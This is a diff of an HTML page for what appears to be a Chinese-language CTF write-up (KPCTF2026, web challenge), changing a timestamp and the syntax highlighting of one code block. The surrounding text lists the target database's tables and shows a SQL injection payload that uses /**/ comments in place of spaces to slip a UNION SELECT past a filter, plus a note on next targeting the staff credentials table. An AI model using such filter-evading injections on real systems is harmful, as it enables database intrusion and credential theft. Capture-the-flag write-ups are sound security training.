@@ -62,7 +62,7 @@
 <meta property="og:image" content="https://linsport.github.io/img/ctf/KPCTF2026/MICS/Guess_the_png_11.png">
 <meta property="og:image" content="https://linsport.github.io/img/ctf/KPCTF2026/MICS/Guess_the_png_12.png">
 <meta property="article:published_time" content="2026-09-14T16:00:00.000Z">
-<meta property="article:modified_time" content="2026-09-16T12:50:28.062Z">
+<meta property="article:modified_time" content="2026-09-16T12:57:33.553Z">
 <meta property="article:author" content="sport lin">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://linsport.github.io/img/ctf/KPCTF2026/WEB/meow1.png">
@@ -335,7 +335,7 @@
 <p>得到数据库中的表和建表语句。<br><img src="/img/ctf/KPCTF2026/WEB/1_percent5.png" srcset="/img/loading.gif" lazyload alt="表结构"><br>通过分析可以知道</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">records    # 记录，可能藏有flag<br>scores     # 是正常成绩查询使用的表。<br>staff      # 可能保存后台工作人员的登录凭据login_user和login_pass<br>users      # 学生账户<br>waf_rules  # 黑名单规则<br></code></pre></td></tr></table></figure>
 <p>其中较为重要的是<code>records</code>和<code>staff</code>，因此先尝试读取<code>records</code>，但发现额外防护。在执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs spl">23630001/**/UNION/**/SELECT/**/1,title,3,body/**/FROM/**/records<br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">23630001</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">UNION</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">SELECT</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,title,<span class="hljs-number">3</span>,body<span class="hljs-comment">/**/</span><span class="hljs-keyword">FROM</span><span class="hljs-comment">/**/</span>records<br></code></pre></td></tr></table></figure>
 <p>语句经行读取时，触发了</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">⚠ 智慧WAF：已拦截疑似攻击请求，该行为已记录。<br></code></pre></td></tr></table></figure>
 <p>由此推断题目存在一层比<code>waf_rules</code>中的黑名单更具体的防护。<br>因此转而访问<code>staff</code></p>
